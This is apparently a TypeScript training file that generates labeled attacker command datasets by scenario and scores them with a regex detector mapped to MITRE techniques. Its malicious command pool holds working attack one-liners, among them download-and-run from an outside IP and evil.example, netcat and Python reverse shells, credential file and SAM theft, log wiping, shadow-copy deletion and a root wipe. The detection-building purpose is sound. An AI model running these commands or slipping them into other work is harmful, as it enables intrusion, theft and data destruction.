// Red vs Blue — integration of two bootcamp projects:
//   RED  (AttackGen): scenario → weighted kill-chain → labeled command dataset.
//   BLUE (SENTRY): score each command vs MITRE/LOLBAS/GTFOBins patterns + bands.
// The Blue engine scans the exact dataset the Red engine generates.

export type Phase = 'discovery' | 'staging' | 'persistence' | 'execution' | 'cleanup' | 'impact'
export const PHASES: { key: Phase; label: string }[] = [
  { key: 'discovery', label: 'Discovery' }, { key: 'staging', label: 'Staging' },
  { key: 'persistence', label: 'Persistence' }, { key: 'execution', label: 'Execution' },
  { key: 'cleanup', label: 'Cleanup' }, { key: 'impact', label: 'Impact' },
]

export interface Scenario { key: string; label: string; desc: string; mix: Record<Phase, number>; story: string }

export const SCENARIOS: Scenario[] = [
  { key: 'ransomware', label: 'Ransomware', desc: 'Encrypt for extortion, destroy recovery.', story: 'The operator swept the host, staged a loot archive, planted persistence, then deleted shadow copies and encrypted data for impact.', mix: { discovery: 3, staging: 4, persistence: 2, execution: 4, cleanup: 2, impact: 5 } },
  { key: 'lateral_movement', label: 'Lateral Movement', desc: 'Pivot across hosts and identities.', story: 'Heavy recon mapped accounts and shares; execution-led pivots moved the operator host to host across the domain.', mix: { discovery: 5, staging: 3, persistence: 3, execution: 6, cleanup: 2, impact: 1 } },
  { key: 'persistence', label: 'Persistence', desc: 'Survive reboots and remediation.', story: 'The operator buried itself in cron, services, run-keys and authorized_keys so a single clean-up would not evict it.', mix: { discovery: 2, staging: 2, persistence: 8, execution: 4, cleanup: 2, impact: 2 } },
  { key: 'credential_dumping', label: 'Credential Dumping', desc: 'Harvest secrets and hashes.', story: 'Discovery and staging dominated: the operator enumerated identities, then dumped SAM/shadow and exfil-staged the secrets.', mix: { discovery: 6, staging: 6, persistence: 2, execution: 3, cleanup: 2, impact: 1 } },
  { key: 'reverse_shell', label: 'Reverse Shell', desc: 'Interactive remote control.', story: 'Execution-heavy: download cradles and nc/python reverse shells gave the operator a live foothold.', mix: { discovery: 3, staging: 2, persistence: 3, execution: 9, cleanup: 2, impact: 1 } },
  { key: 'data_exfiltration', label: 'Data Exfiltration', desc: 'Stage and steal data.', story: 'The operator compressed and encoded sensitive paths, then pushed the loot to an external host.', mix: { discovery: 4, staging: 6, persistence: 2, execution: 4, cleanup: 2, impact: 2 } },
  { key: 'sql_exploitation', label: 'SQL Exploitation', desc: 'Abuse a database for code exec.', story: 'Recon found the DB; execution chained query abuse into OS command execution and dumps.', mix: { discovery: 5, staging: 3, persistence: 2, execution: 7, cleanup: 2, impact: 1 } },
  { key: 'crypto_miner', label: 'Crypto Miner', desc: 'Hijack compute for mining.', story: 'After light recon the operator persisted and ran a miner against a pool, hiding it in noise.', mix: { discovery: 3, staging: 3, persistence: 4, execution: 7, cleanup: 2, impact: 1 } },
  { key: 'privilege_escalation', label: 'Privilege Escalation', desc: 'Gain root / SYSTEM.', story: 'Discovery found a weakness; execution abused it to escalate, then planted persistence as root.', mix: { discovery: 6, staging: 2, persistence: 3, execution: 7, cleanup: 1, impact: 1 } },
  { key: 'defense_evasion', label: 'Defense Evasion', desc: 'Blind the defenders.', story: 'Cleanup-heavy: the operator cleared logs and event channels to erase the trail while it worked.', mix: { discovery: 3, staging: 2, persistence: 3, execution: 3, cleanup: 8, impact: 1 } },
]

interface MalCmd { process: string; cmd: string; phase: Phase; technique: string }
export const MALICIOUS_POOL: MalCmd[] = [
  // discovery
  { process: 'nmap', cmd: 'nmap -sS -p- 10.0.0.0/24', phase: 'discovery', technique: 'T1046' },
  { process: 'bash', cmd: 'whoami && id && hostname && cat /etc/passwd', phase: 'discovery', technique: 'T1033' },
  { process: 'powershell', cmd: 'powershell -nop -c "Get-ADUser -Filter * | select samaccountname"', phase: 'discovery', technique: 'T1087.002' },
  { process: 'cmd', cmd: 'net group "domain admins" /domain', phase: 'discovery', technique: 'T1069.002' },
  { process: 'bash', cmd: 'ps aux; ss -tulpn; netstat -antp', phase: 'discovery', technique: 'T1057' },
  { process: 'bash', cmd: 'nltest /dclist:corp.local', phase: 'discovery', technique: 'T1018' },
  // staging
  { process: 'bash', cmd: 'tar czf /tmp/.loot.tgz /var/www /home', phase: 'staging', technique: 'T1074.001' },
  { process: 'cmd', cmd: 'reg save hklm\\sam %temp%\\sam.save', phase: 'staging', technique: 'T1003.002' },
  { process: 'bash', cmd: 'cp /etc/shadow /tmp/.s && base64 /tmp/.s', phase: 'staging', technique: 'T1003.008' },
  { process: 'powershell', cmd: 'Compress-Archive -Path C:\\data -DestinationPath C:\\temp\\x.zip', phase: 'staging', technique: 'T1074' },
  { process: 'bash', cmd: 'mysqldump -u root --all-databases > /tmp/.db.sql', phase: 'staging', technique: 'T1213' },
  { process: 'powershell', cmd: '[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\\loot"))', phase: 'staging', technique: 'T1027' },
  // persistence
  { process: 'cmd', cmd: 'schtasks /create /tn Updater /tr c:\\x.exe /sc onlogon', phase: 'persistence', technique: 'T1053.005' },
  { process: 'bash', cmd: '(crontab -l; echo "* * * * * /tmp/.x") | crontab -', phase: 'persistence', technique: 'T1053.003' },
  { process: 'bash', cmd: 'echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys', phase: 'persistence', technique: 'T1098.004' },
  { process: 'powershell', cmd: 'New-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name svc -Value c:\\x.exe', phase: 'persistence', technique: 'T1547.001' },
  { process: 'cmd', cmd: 'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svc /d c:\\x.exe', phase: 'persistence', technique: 'T1547.001' },
  { process: 'bash', cmd: 'systemctl enable backdoor.service', phase: 'persistence', technique: 'T1543.002' },
  // execution
  { process: 'powershell', cmd: 'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4...', phase: 'execution', technique: 'T1059.001' },
  { process: 'bash', cmd: 'curl http://185.220.101.45/x.sh | bash', phase: 'execution', technique: 'T1059.004' },
  { process: 'bash', cmd: 'nc -e /bin/sh 185.220.101.45 4444', phase: 'execution', technique: 'T1059.004' },
  { process: 'cmd', cmd: 'mshta http://evil.example/x.hta', phase: 'execution', technique: 'T1218.005' },
  { process: 'bash', cmd: 'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.9.9.9\',4444))"', phase: 'execution', technique: 'T1059.006' },
  { process: 'cmd', cmd: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"', phase: 'execution', technique: 'T1218.011' },
  { process: 'bash', cmd: 'wget -qO- http://evil.example/m | sh', phase: 'execution', technique: 'T1105' },
  { process: 'powershell', cmd: 'IEX (New-Object Net.WebClient).DownloadString("http://evil/p.ps1")', phase: 'execution', technique: 'T1059.001' },
  // cleanup
  { process: 'bash', cmd: 'history -c; rm -rf /var/log/*', phase: 'cleanup', technique: 'T1070.003' },
  { process: 'bash', cmd: 'shred -u /tmp/.loot.tgz', phase: 'cleanup', technique: 'T1070.004' },
  { process: 'cmd', cmd: 'wevtutil cl Security', phase: 'cleanup', technique: 'T1070.001' },
  { process: 'bash', cmd: 'echo > /var/log/auth.log', phase: 'cleanup', technique: 'T1070.002' },
  { process: 'powershell', cmd: 'Clear-EventLog -LogName Security', phase: 'cleanup', technique: 'T1070.001' },
  { process: 'bash', cmd: 'touch -r /bin/ls /tmp/.x', phase: 'cleanup', technique: 'T1070.006' },
  // impact
  { process: 'bash', cmd: 'openssl enc -aes-256-cbc -in /data -out /data.enc -k pass && rm /data', phase: 'impact', technique: 'T1486' },
  { process: 'cmd', cmd: 'vssadmin delete shadows /all /quiet', phase: 'impact', technique: 'T1490' },
  { process: 'bash', cmd: 'rm -rf --no-preserve-root /', phase: 'impact', technique: 'T1485' },
  { process: 'bash', cmd: './xmrig -o pool.minexmr.com:443 -u wallet --tls', phase: 'impact', technique: 'T1496' },
  { process: 'cmd', cmd: 'cipher /w:c:\\', phase: 'impact', technique: 'T1485' },
]

export const BENIGN_POOL: { process: string; cmd: string }[] = [
  { process: 'bash', cmd: 'ls -la /var/www/html' }, { process: 'bash', cmd: 'systemctl status nginx' },
  { process: 'docker', cmd: 'docker ps -a' }, { process: 'kubectl', cmd: 'kubectl get pods -n payments' },
  { process: 'bash', cmd: 'tail -f /var/log/syslog' }, { process: 'apt', cmd: 'apt-get update && apt-get upgrade -y' },
  { process: 'git', cmd: 'git pull origin main' }, { process: 'bash', cmd: 'df -h' },
  { process: 'bash', cmd: 'top -bn1 | head -20' }, { process: 'python3', cmd: 'python3 manage.py migrate' },
  { process: 'rsync', cmd: 'rsync -a /data /backup/nightly' }, { process: 'npm', cmd: 'npm ci && npm run build' },
  { process: 'bash', cmd: 'curl -fsS https://api.stripe.com/v1/charges' }, { process: 'openssl', cmd: 'openssl s_client -connect api.internal:443' },
  { process: 'cmd', cmd: 'ipconfig /all' }, { process: 'bash', cmd: 'journalctl -u kubelet --since "1 hour ago"' },
  { process: 'bash', cmd: 'tar czf /backup/db-2026-06-21.tgz /var/lib/pgsql' }, { process: 'helm', cmd: 'helm upgrade api ./chart' },
  { process: 'bash', cmd: 'free -m' }, { process: 'bash', cmd: 'ping -c 4 8.8.8.8' },
  { process: 'aws', cmd: 'aws s3 ls s3://reports/' }, { process: 'bash', cmd: 'grep ERROR /var/log/app/app.log' },
  { process: 'systemctl', cmd: 'systemctl restart payments-api' }, { process: 'bash', cmd: 'crontab -l' },
  { process: 'psql', cmd: 'psql -c "SELECT count(*) FROM orders"' }, { process: 'bash', cmd: 'chmod 644 /etc/app/config.yml' },
  { process: 'terraform', cmd: 'terraform plan -out plan.bin' }, { process: 'bash', cmd: 'uptime' },
  { process: 'docker', cmd: 'docker logs --tail 100 web' }, { process: 'bash', cmd: 'ssh deploy@web "uptime"' },
  { process: 'bash', cmd: 'find /var/log -name "*.gz" -mtime +30 -delete' }, { process: 'kubectl', cmd: 'kubectl rollout status deploy/api' },
  { process: 'bash', cmd: 'cat /proc/loadavg' }, { process: 'node', cmd: 'node server.js --port 3000' },
  // bait — individually-benign but pattern-tickling (causes realistic false positives)
  { process: 'bash', cmd: 'base64 /etc/hostname' },
  { process: 'powershell', cmd: 'powershell -nop -c Get-Process | Sort CPU' },
]

export interface Row { id: number; process: string; command: string; label: 'malicious' | 'benign'; phase?: Phase; technique?: string }

function lcg(seed: number) { let s = seed % 2147483647; if (s <= 0) s += 2147483646; return () => (s = (s * 16807) % 2147483647) / 2147483647 }

export function generateDataset(scenarioKey: string, seed: number): Row[] {
  const scn = SCENARIOS.find((s) => s.key === scenarioKey) ?? SCENARIOS[0]
  const rnd = lcg(seed)
  const rows: Row[] = []
  let id = 1
  // pick malicious per phase by the scenario mix, cycling the pool
  for (const phase of PHASES) {
    const pool = MALICIOUS_POOL.filter((m) => m.phase === phase.key)
    const want = scn.mix[phase.key]
    const start = Math.floor(rnd() * pool.length)
    for (let i = 0; i < want; i++) {
      const m = pool[(start + i) % pool.length]
      rows.push({ id: id++, process: m.process, command: m.cmd, label: 'malicious', phase: phase.key, technique: m.technique })
    }
  }
  // benign noise
  for (const b of BENIGN_POOL) rows.push({ id: id++, process: b.process, command: b.cmd, label: 'benign' })
  // shuffle (Fisher–Yates, seeded)
  for (let i = rows.length - 1; i > 0; i--) { const j = Math.floor(rnd() * (i + 1));[rows[i], rows[j]] = [rows[j], rows[i]] }
  return rows.map((r, i) => ({ ...r, id: i + 1 }))
}

// ---- BLUE: SENTRY-style deterministic scoring ----
interface Pat { id: string; re: RegExp; w: number; technique: string; tactic: string; desc: string }
const P = (id: string, re: string, w: number, technique: string, tactic: string, desc: string): Pat => ({ id, re: new RegExp(re, 'i'), w, technique, tactic, desc })

export const PATTERNS: Pat[] = [
  P('ps_enc', 'powershell.*\\s-e(nc|ncodedcommand)?\\b', 0.7, 'T1059.001', 'execution', 'PowerShell encoded command'),
  P('iex_dl', 'iex\\s*\\(.*(downloadstring|downloaddata|iwr)', 0.85, 'T1059.001', 'execution', 'IEX download cradle'),
  P('pipe_sh', '(curl|wget)\\s+.*\\|\\s*(ba)?sh', 0.85, 'T1059.004', 'execution', 'Download piped to shell'),
  P('nc_exec', '\\bnc\\b.*\\s-e\\b', 0.9, 'T1059.004', 'execution', 'Netcat reverse shell'),
  P('mshta', 'mshta(\\.exe)?.*(http|javascript:|vbscript:)', 0.8, 'T1218.005', 'defense-evasion', 'mshta remote execution'),
  P('rundll32', 'rundll32.*(javascript:|vbscript:|mshtml)', 0.8, 'T1218.011', 'defense-evasion', 'rundll32 script proxy'),
  P('py_revshell', 'python3?\\s+-c.*socket.*(subprocess|connect)', 0.75, 'T1059.006', 'execution', 'Python reverse shell'),
  P('reg_sam', 'reg\\s+save\\s+hklm\\\\(sam|system|security)', 0.9, 'T1003.002', 'credential-access', 'SAM hive theft'),
  P('shadow', '(/etc/shadow|/etc/passwd).*(base64|cp|cat)', 0.8, 'T1003.008', 'credential-access', 'Unix credential file access'),
  P('mimikatz', '(mimikatz|sekurlsa|lsadump)', 0.95, 'T1003.001', 'credential-access', 'Mimikatz / LSASS dump'),
  P('schtasks', 'schtasks\\s+/create', 0.6, 'T1053.005', 'persistence', 'Scheduled task created'),
  P('cron_persist', 'crontab\\s+-.*echo|echo.*\\|\\s*crontab', 0.6, 'T1053.003', 'persistence', 'Cron persistence'),
  P('authkeys', 'authorized_keys', 0.7, 'T1098.004', 'persistence', 'SSH authorized_keys modified'),
  P('run_key', 'reg\\s+add.*currentversion\\\\run|new-itemproperty.*\\\\run', 0.6, 'T1547.001', 'persistence', 'Registry Run key'),
  P('systemd_persist', 'systemctl\\s+enable\\s+\\w+', 0.4, 'T1543.002', 'persistence', 'systemd service enabled'),
  P('clearlogs', '(history\\s+-c|rm\\s+-rf\\s+/var/log|>\\s*/var/log)', 0.7, 'T1070.002', 'defense-evasion', 'Log clearing'),
  P('wevtutil', '(wevtutil\\s+cl|clear-eventlog)', 0.8, 'T1070.001', 'defense-evasion', 'Windows event log cleared'),
  P('shred', '\\bshred\\b\\s+-', 0.6, 'T1070.004', 'defense-evasion', 'File shredding'),
  P('vss_delete', 'vssadmin\\s+delete\\s+shadows', 0.9, 'T1490', 'impact', 'Shadow copy deletion'),
  P('ransom_enc', 'openssl\\s+enc\\s+-aes', 0.6, 'T1486', 'impact', 'Bulk encryption'),
  P('rm_root', 'rm\\s+-rf\\s+--no-preserve-root', 0.95, 'T1485', 'impact', 'Destructive wipe'),
  P('miner', '(xmrig|minexmr|stratum\\+tcp)', 0.9, 'T1496', 'impact', 'Crypto miner'),
  P('cipher_w', 'cipher\\s+/w', 0.6, 'T1485', 'impact', 'Free-space wipe'),
  P('nmap', 'nmap\\s+-s', 0.5, 'T1046', 'discovery', 'Network scan'),
  P('ad_recon', '(get-aduser|net\\s+group.*domain|nltest)', 0.45, 'T1087.002', 'discovery', 'AD reconnaissance'),
  P('dbdump', 'mysqldump.*--all-databases', 0.5, 'T1213', 'collection', 'Database dump'),
  // weak dual-use signals — fire on bait, mostly LOW alone
  P('base64', '\\bbase64\\b', 0.4, 'T1027', 'defense-evasion', 'base64 encode/decode'),
  P('ps_nop', 'powershell.*-nop(rofile)?\\b', 0.3, 'T1059.001', 'execution', 'PowerShell no-profile'),
]

const BENIGN_REDUCERS: { re: RegExp; w: number }[] = [
  { re: /\/backup\//i, w: -0.3 }, { re: /api\.stripe\.com|s_client/i, w: -0.3 },
  { re: /\b(kubectl|helm|terraform|docker)\b/i, w: -0.2 },
]

export type Band = 'HIGH' | 'GRAY' | 'LOW'
export interface Scored { row: Row; score: number; band: Band; signals: string[]; technique: string | null; tactic: string | null }

export function scoreRow(row: Row): Scored {
  const hay = `${row.process} ${row.command}`
  let score = 0
  const signals: string[] = []
  let technique: string | null = null
  let tactic: string | null = null
  for (const p of PATTERNS) {
    if (p.re.test(hay)) {
      score += p.w
      signals.push(`${p.desc} [${p.technique}]`)
      if (!technique) { technique = p.technique; tactic = p.tactic }
    }
  }
  for (const b of BENIGN_REDUCERS) if (b.re.test(hay)) score += b.w
  score = Math.max(0, Math.min(1, score))
  const band: Band = score >= 0.75 ? 'HIGH' : score >= 0.35 ? 'GRAY' : 'LOW'
  return { row, score, band, signals, technique, tactic }
}

export interface ScanResult {
  scored: Scored[]
  malicious: number
  caughtHigh: number
  caughtGray: number
  missed: number
  falsePositives: number
  detectionRate: number
}

export function scanDataset(rows: Row[]): ScanResult {
  const scored = rows.map(scoreRow).sort((a, b) => b.score - a.score)
  const malicious = rows.filter((r) => r.label === 'malicious').length
  let caughtHigh = 0, caughtGray = 0, missed = 0, falsePositives = 0
  for (const s of scored) {
    const flagged = s.band !== 'LOW'
    if (s.row.label === 'malicious') {
      if (s.band === 'HIGH') caughtHigh++
      else if (s.band === 'GRAY') caughtGray++
      else missed++
    } else if (flagged) falsePositives++
  }
  const detectionRate = malicious ? Math.round(((caughtHigh + caughtGray) / malicious) * 100) : 0
  return { scored, malicious, caughtHigh, caughtGray, missed, falsePositives, detectionRate }
}
